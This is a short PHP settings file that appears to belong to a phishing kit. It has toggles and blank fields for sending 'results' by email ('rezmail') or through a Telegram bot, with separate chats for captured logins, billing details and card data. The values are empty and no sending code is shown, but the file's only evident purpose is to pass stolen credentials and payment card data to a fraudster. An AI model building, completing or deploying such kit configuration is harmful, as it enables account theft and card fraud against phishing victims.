<?php

##### SETTINGS ######


# Mail RESULTS SETTINGS
$mail_sending = false;                                           # 
$rezmail = ""; 

#TELEGRAM RESULT SETTINGS
$telegram_sending = true;                                       # 
$bot_token = "";
$chat_login = "";                                 # 
$chat_billing = "";                               # 
$chat_card = "";                                  # 


$test_mode = false;

?>